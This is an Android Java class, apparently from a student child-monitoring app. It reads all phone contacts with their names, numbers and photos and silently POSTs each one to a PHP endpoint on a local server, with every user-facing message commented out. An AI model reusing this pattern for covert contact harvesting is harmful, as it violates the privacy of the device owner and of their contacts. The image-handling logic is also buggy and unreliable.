package com.ntt.tainguyen197.childapplication;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;


import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class UploadContact {

    String url = "http://192.168.1.8:8000/androidwebservice/insert.php";
    public ArrayList<Contact> getContactArrayList() {
        return contactArrayList;
    }

    ArrayList<Contact> contactArrayList;
    Context context;

    public UploadContact(Context ct){
        context = ct;
    }

    void OnCreat()
    {
        contactArrayList = new ArrayList<Contact>();
        DataArray();
        //Toast.makeText(context, "Co "+ Integer.toString(contactArrayList.size()), Toast.LENGTH_SHORT).show();

        for (int i = 0;i<contactArrayList.size();i++) {
            uploadContactToServer(i, contactArrayList);
            //Toast.makeText(context, "xong", Toast.LENGTH_SHORT).show();
        }

    }
    public void DataArray() {

            // Permission has already been granted
            Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
            while (phones.moveToNext())
            {
                String image_uri = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_URI));
                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                BitmapFactory.Options options = new BitmapFactory.Options();
                options.inSampleSize = 8;
                Bitmap bitmap =  BitmapFactory.decodeResource(context.getResources(),
                        R.drawable.default_image,options);
                ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG,30,byteArrayOutputStream);
                try {
                    bitmap = MediaStore.Images.Media
                            .getBitmap(context.getContentResolver(),
                                    Uri.parse(image_uri));
                }
                catch (Exception e){

                }

                //Bitmap to String
                byte[] img = byteArrayOutputStream.toByteArray();
                String base64Image = Base64.encodeToString(img, Base64.DEFAULT);
                if(name == null || name =="")
                    name = "User";
                contactArrayList.add(new Contact(1,name,phoneNumber,base64Image));
            }
            phones.close();

    }
    private void uploadContactToServer(final int pos, final ArrayList<Contact> lst){
        RequestQueue rsthemsv = Volley.newRequestQueue(context);
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                if(response.trim().equals("success")){
                    //Toast.makeText(context, "Thêm thành công", Toast.LENGTH_SHORT).show();
                }
                else
                {

                   // Toast.makeText(context, response.toString(), Toast.LENGTH_SHORT).show();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                //Toast.makeText(context, "Có lỗi xảy ra", Toast.LENGTH_SHORT).show();
            }
        }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String,String> params = new HashMap<>();
                params.put("hoten",lst.get(pos).getTen().toString());
                params.put("sdt",lst.get(pos).getSDT().toString());

                params.put("imgprofile",lst.get(pos).getProfilestring());

                //Bitmap to String
                /*ByteArrayOutputStream bos = new ByteArrayOutputStream();
                Bitmap bm = lst.get(pos).getProfile();
                bm.compress(Bitmap.CompressFormat.JPEG, 30, bos);
                byte[] img = bos.toByteArray();
                String base64Image = Base64.encodeToString(img, Base64.DEFAULT);*/



                return params;
            }
        };

        rsthemsv.add(stringRequest);
    }

    /*Bitmap bitmap = null;
            try{
        byte[] data1 = Base64.decode(urlImg, Base64.DEFAULT);
        Bitmap bm;
        BitmapFactory.Options opt = new BitmapFactory.Options();
        opt.inMutable = true;
        bm = BitmapFactory.decodeByteArray(data1, 0, data1.length, opt);
        avatar.setImageBitmap(bm);
    }catch (Exception e){
    }*/
}
